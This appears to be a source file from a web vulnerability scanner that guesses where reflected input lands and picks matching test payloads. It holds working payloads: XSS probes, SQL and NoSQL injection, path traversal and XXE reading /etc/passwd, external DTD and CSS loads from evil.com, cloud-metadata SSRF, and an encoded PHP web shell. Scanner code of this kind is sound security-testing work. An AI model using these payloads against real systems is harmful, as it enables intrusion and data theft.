
# scanner/context_engine.py
# ──────────────────────────────────────────────────────────────────────────────
# CONTEXT ENGINE — Detects where user input lands in a response so the fuzzer
# can select the highest-probability payload for that injection context.
# Covers: HTML body, HTML attribute, JavaScript, JSON, URL, CSS, XML, PHP source.
# ──────────────────────────────────────────────────────────────────────────────

import re
from scanner.fuzzer import (
    XSS_PAYLOADS, SQLI_PAYLOADS, SSTI_PAYLOADS,
    TRAVERSAL_PAYLOADS, CMDI_PAYLOADS, SSRF_PAYLOADS,
)
from scanner.dast.payloads import (
    XSS_PAYLOADS as DAST_XSS, SQLI_PAYLOADS as DAST_SQLI,
    LFI_PAYLOADS, OPEN_REDIRECT_PAYLOADS, XXE_PAYLOADS,
    NOSQL_PAYLOADS,
)


class ContextEngine:
    # Context labels
    HTML      = "html"
    ATTRIBUTE = "attribute"
    JS        = "javascript"
    JSON      = "json"
    URL       = "url"
    CSS       = "css"
    XML       = "xml"
    PHP       = "php_source"
    UNKNOWN   = "unknown"

    def detect_context(self, response_text: str, marker: str) -> str:
        """
        Determine the injection context by examining the text around the marker.
        Returns one of the context label constants.
        """
        if not response_text or not marker:
            return self.UNKNOWN

        idx = response_text.find(marker)
        if idx == -1:
            return self.UNKNOWN

        # Window: 200 chars before and 200 chars after the marker
        window = response_text[max(0, idx - 200): idx + 200]

        # PHP source context (wrapper / source disclosure)
        if re.search(r'<\?php|\$_(GET|POST|REQUEST|SESSION|COOKIE)', window):
            return self.PHP

        # XML / XXE context
        if re.search(r'<\?xml|<!DOCTYPE|<!\[CDATA\[', window):
            return self.XML

        # CSS context
        if re.search(r'style\s*=|<style|@keyframes|\.css', window, re.IGNORECASE):
            return self.CSS

        # JSON context (inside a JSON value)
        if re.search(r'"[^"]*' + re.escape(marker) + r'[^"]*"', window):
            return self.JSON
        if re.search(r':\s*".*' + re.escape(marker), window):
            return self.JSON

        # JavaScript context
        if re.search(r'<script[^>]*>.*' + re.escape(marker), window, re.DOTALL | re.IGNORECASE):
            return self.JS
        if re.search(r'var\s+\w+\s*=|function\s*\(|=>\s*{', window):
            return self.JS

        # URL context (href, src, action, data attributes)
        if re.search(r'(href|src|action|data-url)\s*=\s*["\'][^"\']*' + re.escape(marker), window, re.IGNORECASE):
            return self.URL

        # HTML attribute context
        if re.search(r'=\s*["\'][^"\']*' + re.escape(marker) + r'[^"\']*["\']', window):
            return self.ATTRIBUTE
        if re.search(r'\w+\s*=\s*' + re.escape(marker), window):
            return self.ATTRIBUTE

        # HTML body context
        if re.search(r'>[^<]*' + re.escape(marker), window):
            return self.HTML

        return self.UNKNOWN

    def get_payloads(self, context: str) -> list:
        """
        Return the best payload list for a given injection context.
        """
        payloads = {
            self.HTML: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe srcdoc='<script>alert(1)</script>'>",
            ],

            self.ATTRIBUTE: [
                '" onmouseover=alert(1) x="',
                "' onfocus=alert(1) autofocus '",
                '" onclick=alert(1) "',
                '" onload=alert(1) "',
                "' OR 1=1--",                       # SQLi can also live in attributes
                "\" OR \"1\"=\"1",
            ],

            self.JS: [
                "';alert(1);//",
                '";alert(1);//',
                "`;alert(1)//",
                "'-alert(1)-'",
                "\\';alert(1);//",
                # SQLi via JS fetch params
                "' OR 1=1--",
                # SSTI via JS template literals
                "${7*7}",
            ],

            self.JSON: [
                '"};</script><script>alert(1)//',
                '{"$gt": ""}',                       # NoSQL injection
                '{"$where": "1==1"}',
                "' OR 1=1--",
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            ],

            self.URL: [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "//evil.com",
                "http://169.254.169.254/latest/meta-data/",  # SSRF via URL context
                "file:///etc/passwd",
                "http://127.0.0.1",
            ],

            self.CSS: [
                "background-image:url('javascript:alert(1)')",
                "expression(alert(1))",
                "</style><script>alert(1)</script>",
                "<style>@import 'http://evil.com/steal.css';</style>",
            ],

            self.XML: [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo/>',
            ],

            self.PHP: [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=string.rot13/resource=../../config.php",
                "php://input",
                "expect://id",
                "../../../etc/passwd",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            ],

            self.UNKNOWN: [
                # Polyglot: works across HTML, JS, URL, attribute
                "<script>alert(1)</script>",
                "' OR 1=1--",
                "{{7*7}}",
                "../../../etc/passwd",
                "; id",
                "http://169.254.169.254",
            ],
        }

        return payloads.get(context, payloads[self.UNKNOWN])

    def get_sqli_payloads_for_context(self, context: str) -> list:
        """SQLi payloads tuned for the detected context."""
        if context == self.JSON:
            return [
                '{"$gt": ""}',
                '{"$where": "1==1"}',
                "' OR 1=1--",
                '", "password": "x" OR "1"="1',
            ]
        elif context in (self.URL, self.ATTRIBUTE):
            return [
                "' OR 1=1--",
                "%27+OR+1%3D1--",
                "'+OR+'1'%3D'1",
            ]
        else:
            return SQLI_PAYLOADS

